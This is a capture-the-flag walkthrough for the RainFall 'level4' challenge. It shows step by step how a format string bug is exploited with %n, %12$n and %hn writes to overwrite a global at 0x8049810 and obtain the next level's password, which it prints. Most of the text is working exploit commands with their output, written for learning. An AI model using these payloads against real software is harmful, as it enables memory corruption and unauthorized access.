# Walkthrough level4

Here this is a format string exploitation but the value to write is bigger. We
want to write 0x1025544 in the address 0x8049810. First thing try to locate
where is located the begining of our buffer:

```bash
level4@RainFall:~$ python -c "print('AAAA' + '%08x ' * 20)" | ./level4
AAAAb7ff26b0 bffff784 b7fd0ff4 00000000 00000000 bffff748 0804848d bffff540 00000200 b7fd1ac0 b7ff37d0 41414141 78383025 38302520 30252078 25207838 20783830 78383025 38302520 30252078
```

Buffer start is the 12th addresses further. So we can write something in the address:

```bash
(gdb) r < <("print('\x10\x98\x04\x08' + '%08x ' * 11 + '%n')")
(gdb) disas
   0x08048488 <+49>:    call   0x8048444 <p>
   0x0804848d <+54>:    mov    eax,ds:0x8049810
=> 0x08048492 <+59>:    cmp    eax,0x1025544
   0x08048497 <+64>:    jne    0x80484a5 <n+78>
   0x08048499 <+66>:    mov    DWORD PTR [esp],0x8048590
   0x080484a0 <+73>:    call   0x8048360 <system@plt>
End of assembler dump.
(gdb) p $eax
$2 = 103
```

We can write in the variable we want but we need to write a big value.
To do this we can use the `%Xd` specifier, it print the number with X
characters so if we do `%100d` printf will print 100 characters.
To do this we need to go one address below because `%d` consume an address:

```bash
(gdb) r < <(python -c "print('\x10\x98\x04\x08' + '%08x ' * 10 + '%100d%n')")
(gdb) p $eax
$4 = 194
```

Now we can do the same thing but write the value:
> 0x1025544 (16930116 in decimal) - 94 (characters already printed) = 16930022

```bash
level4@RainFall:~$ python -c "print('\x10\x98\x04\x08' + '%08x ' * 10 + '%16930022d%n')" > /tmp/a
level4@RainFall:~$ cat /tmp/a - | ./level4
(...)
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

Go further with `%X$n` modifier:

```bash
level4@RainFall:~$ python -c 'print("\x10\x98\x04\x08" + "%16930112d%12$n")' | ./level4
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

> 0x1025544 (16930116 in decimal) - 94 (characters already printed) = 16930022
And with `$X$hn`:

```bash
Split the address to write in 2 bytes:
high = 0x102 = 258
low = 0x5544 = 21828
08049812 + 08049810 + %Xd%12$n + "%Yd%13$n"
X = 258 - 8 = 250
Y = 21828 - X + 8 = 21570
```

```bash
level4@RainFall:~$ python -c 'print("\x12\x98\x04\x08" + "\x10\x98\x04\x08" \
+ "%250d%12$hn" + "%21570d%13$hn")' | ./level4
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
